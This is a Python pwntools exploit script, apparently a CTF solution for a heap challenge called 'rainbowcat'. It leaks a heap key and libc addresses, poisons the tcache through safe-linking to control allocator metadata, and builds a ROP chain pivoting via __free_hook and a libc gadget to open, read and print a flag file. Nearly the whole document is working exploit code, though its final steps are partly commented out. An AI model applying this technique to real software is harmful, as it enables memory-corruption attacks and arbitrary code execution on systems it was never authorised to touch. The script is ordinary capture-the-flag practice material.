# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './rainbowcat'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(idx ):
    cmd(1)
    sla('get?' , idx)

def edit(idx , text):
    cmd(4)
    sla('one?' , idx)
    sa('cat:' , text)

def show(idx ):
    cmd(3)
    sla('name:' , idx)

def delete(idx ):
    cmd(2)
    sla('abandon?' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0)
    add(1)

    delete(0)
    show(0)
    ru('Name:')
    key = uu64(5)

    heap_base = key << 12
    lg('heap_base',heap_base)

    delete(1)
    edit(1 , p64(key^(heap_base+0x10)))
    add(2)
    add(0)

    add(1)
    add(2)
    delete(1)
    delete(2)

    edit(2 , p64(key^(heap_base+0x50)))
    add(1)
    add(2)
    edit(2 , p16(7)*8)
    add(1)
    add(2)

    delete(0)
    show(0)
    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    # 下面 2.31 标准开启 orw
    magic = 0x14d09a + libc.address
    
    # svcudp_reply+26
    # mov    rbp, qword ptr [rdi + 0x48]
    # mov    rax, qword ptr [rbp + 0x18]
    # lea    r13, [rbp + 0x10]
    # mov    dword ptr [rbp + 0x10], 0
    # mov    rdi, r13
    # call   qword ptr [rax + 0x28]
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r12 ; pop r13 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60
    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80
    
    payload = p64( magic ) + magic_chain
    # dbg('free')
    
    getflag =p64(ret)*0xc + chain

    edit(0 , '\x00'*4)

    delete(1)
    delete(2)
    edit(2 , p64(key^(heap_base+0x90)))

    add(1)
    add(2)

    # edit(0 , p64(7))
    # edit(2 , p64(__free_hook))

    # dbg()
    # add(1)
    # edit(1 , magic_chain[0:0x20])

    dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   rainbowcat.py
@Time    :   2022/07/02 11:46:31
@Author  :   Niyah 
'''